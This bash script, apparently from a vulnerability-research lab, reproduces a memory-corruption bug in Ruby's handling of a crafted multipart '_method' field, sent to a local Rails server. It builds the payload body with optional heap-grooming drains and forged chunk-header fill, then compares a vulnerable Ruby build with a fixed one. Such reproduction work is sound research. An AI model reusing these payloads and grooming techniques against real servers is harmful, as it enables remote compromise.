#!/bin/bash
# Unmodified Rails request/survival probe. Loopback only.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-stock-rails-$MODE-1}"
N="${RUBY2SHELL_STOCK_N:-828}"
FILL="${RUBY2SHELL_STOCK_FILL:-6}"
ORDER="${RUBY2SHELL_STOCK_ORDER:-method-first}"
PORT="${RUBY2SHELL_STOCK_PORT:-4552}"
APP="${RUBY2SHELL_STOCK_APP:-lab/build/rails-stock-app}"
ROUTE="${RUBY2SHELL_STOCK_ROUTE:-/not-a-route}"
case "$MODE" in
  attack|control|fixed) ;;
  *) echo "usage: $0 [attack|control|fixed] [tag] [ruby-bin]" >&2; exit 2 ;;
esac
if [ "$MODE" = fixed ]; then
  RB="${3:-lab/build/plain/ruby-3.4.13-plain/bin/ruby}"
else
  RB="${3:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
fi
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
EV=lab/build/evidence
OUT="$EV/stock-rails-$TAG.out"
LOG="$EV/stock-rails-$TAG.server.log"
BODY="${RUBY2SHELL_STOCK_BODY_FILE:-$EV/stock-rails-$TAG.body}"
HTML="${RUBY2SHELL_STOCK_HTML:-$EV/stock-rails-$TAG.html}"
PIDFILE="$PWD/$EV/stock-rails-$TAG.pid"
ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
mkdir -p "$EV"
rm -f "$ARM"
if [ -z "${RUBY2SHELL_STOCK_BODY_FILE:-}" ]; then
python3 - "$MODE" "$N" "$FILL" "$ORDER" "$BODY" <<'PY'
from pathlib import Path
import os
import sys
mode, n, fill, order, output = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4], sys.argv[5]
data = b'\xdf' * n if mode == 'control' else b'a' + b'\xdf' * (n - 1)
tail_hex = os.environ.get('RUBY2SHELL_STOCK_TAIL_HEX')
if tail_hex and mode != 'control':
    tail = bytes.fromhex(tail_hex)
    if len(tail) > len(data):
        raise ValueError('tail is longer than _method')
    data = data[:-len(tail)] + tail if tail else data
if 'RUBY2SHELL_STOCK_FILL_PREV' in os.environ:
    prev = int(os.environ['RUBY2SHELL_STOCK_FILL_PREV'], 0)
    next_size = int(os.environ['RUBY2SHELL_STOCK_FILL_SIZE'], 0)
    pattern = prev.to_bytes(8, 'little') + next_size.to_bytes(8, 'little')
    fill_bytes = (pattern * ((fill + 15) // 16))[:fill]
else:
    fill_bytes = b'f' * fill
def part(name, content, content_type=b'text/plain'):
    return (b'--XB\r\nContent-Disposition: form-data; name="' + name + b'"\r\n'
            b'Content-Type: ' + content_type + b'\r\n\r\n' + content)
parts = []
part_type = (b'text/plain; charset=ASCII-8BIT'
             if os.environ.get('RUBY2SHELL_STOCK_PART_CHARSET') else b'text/plain')
for group in os.environ.get('RUBY2SHELL_STOCK_DRAIN', '').split(','):
    if group:
        length, count = (int(value, 0) for value in group.split(':', 1))
        if 'RUBY2SHELL_STOCK_FILL_PREV' in os.environ and os.environ.get('RUBY2SHELL_STOCK_DRAIN_FAKE'):
            drain_bytes = (pattern * ((length + 15) // 16))[:length]
        else:
            drain_bytes = b'd' * length
        parts.extend(part(f'd{len(parts)}'.encode(), drain_bytes, part_type)
                     for _ in range(count))
method = part(b'_method', data, b'text/plain; charset=ISO-8859-1')
filler = part(b'f', fill_bytes, part_type)
parts.extend((filler, method) if order == 'filler-first' else (method, filler))
Path(output).write_bytes(b'\r\n'.join(parts) + b'\r\n--XB--\r\n')
PY
fi
if [ ! -f "$APP/config/environment.rb" ]; then
  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
  exit 2
fi
CURL_TRANSFER=()
if [ "${RUBY2SHELL_STOCK_CHUNKED:-0}" = 1 ]; then
  CURL_TRANSFER=(-H 'Transfer-Encoding: chunked')
fi
if [ -n "${RUBY2SHELL_STOCK_EXTRA_HEADER:-}" ]; then
  # wire-shaping knob: adds one attacker header of the given value
  CURL_TRANSFER+=(-H "X-X2Shell-Pad: $RUBY2SHELL_STOCK_EXTRA_HEADER")
fi
if [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" = 1 ]; then
  MTRACE_FD=2 MTRACE_EMIT_ARM_FILE="$ARM" MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
elif [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ]; then
  MTRACE_FD=2 MTRACE_CASE_ONLY=1 MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
elif [ "${RUBY2SHELL_STOCK_TRACE:-0}" = 1 ]; then
  MTRACE_FD=2 LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
else
  "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" > "$LOG" 2>&1 &
fi
PID=$!
cleanup() {
  if kill -0 "$PID" 2>/dev/null; then
    kill "$PID" 2>/dev/null
    for _ in $(seq 1 50); do
      if ! kill -0 "$PID" 2>/dev/null; then break; fi
      sleep 0.1
    done
    if kill -0 "$PID" 2>/dev/null; then kill -KILL "$PID" 2>/dev/null; fi
  fi
  wait "$PID" 2>/dev/null
  rm -f "$PIDFILE" "$ARM"
}
trap cleanup EXIT
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1; then
    READY=YES
    break
  fi
  sleep 0.1
done
if [ "${RUBY2SHELL_STOCK_CASE_PROBE:-0}" = 1 ] && [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" != 1 ]; then touch "$ARM"; fi
TRIGGER_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
  -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
  "${CURL_TRANSFER[@]}" --data-binary "@$BODY" -o "$HTML" -w '%{http_code}' 2>>"$LOG")
if [ "${RUBY2SHELL_STOCK_PROBE_SECOND:-0}" != 1 ] && [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" != 1 ]; then rm -f "$ARM"; fi
if kill -0 "$PID" 2>/dev/null; then AFTER_TRIGGER=YES; else AFTER_TRIGGER=NO; fi
ALIVE_HTTP=$(curl -s -m 5 "http://127.0.0.1:$PORT/up" -o /dev/null -w '%{http_code}' 2>>"$LOG")
SECOND_HTTP=NA
if [ -n "${RUBY2SHELL_STOCK_SECOND_BODY_FILE:-}" ]; then
  if [ "${RUBY2SHELL_STOCK_FULL_SECOND:-0}" = 1 ]; then touch "$ARM"; fi
  SECOND_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$RUBY2SHELL_STOCK_SECOND_BODY_FILE" \
    -o "${RUBY2SHELL_STOCK_SECOND_HTML:-$EV/stock-rails-$TAG-second.html}" \
    -w '%{http_code}' 2>>"$LOG")
fi
if [ "${RUBY2SHELL_STOCK_PROBE_SECOND:-0}" = 1 ] && [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" != 1 ]; then rm -f "$ARM"; fi
THIRD_HTTP=NA
if [ -n "${RUBY2SHELL_STOCK_THIRD_BODY_FILE:-}" ]; then
  THIRD_HTTP=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$ROUTE" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$RUBY2SHELL_STOCK_THIRD_BODY_FILE" \
    -o "${RUBY2SHELL_STOCK_THIRD_HTML:-$EV/stock-rails-$TAG-third.html}" \
    -w '%{http_code}' 2>>"$LOG")
fi
if [ "${RUBY2SHELL_STOCK_PROBE_THIRD:-0}" = 1 ]; then rm -f "$ARM"; fi
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
{
  echo "== $TAG mode=$MODE ruby=$RB n=$N fill=$FILL order=$ORDER"
  echo "ready=$READY trigger-http=$TRIGGER_HTTP alive-after-trigger=$AFTER_TRIGGER later-http=$ALIVE_HTTP second-http=$SECOND_HTTP third-http=$THIRD_HTTP process-alive=$ALIVE"
} | tee "$OUT"
if [ "$READY" != YES ] || [ "$TRIGGER_HTTP" != 404 ] || [ "$AFTER_TRIGGER" != YES ] || [ "$ALIVE_HTTP" != 200 ] || [ "$ALIVE" != YES ]; then
  exit 1
fi
if [ -n "${RUBY2SHELL_STOCK_SECOND_BODY_FILE:-}" ] && [ "$SECOND_HTTP" != 404 ]; then
  exit 1
fi
if [ -n "${RUBY2SHELL_STOCK_THIRD_BODY_FILE:-}" ] && [ "$THIRD_HTTP" != 404 ]; then
  exit 1
fi
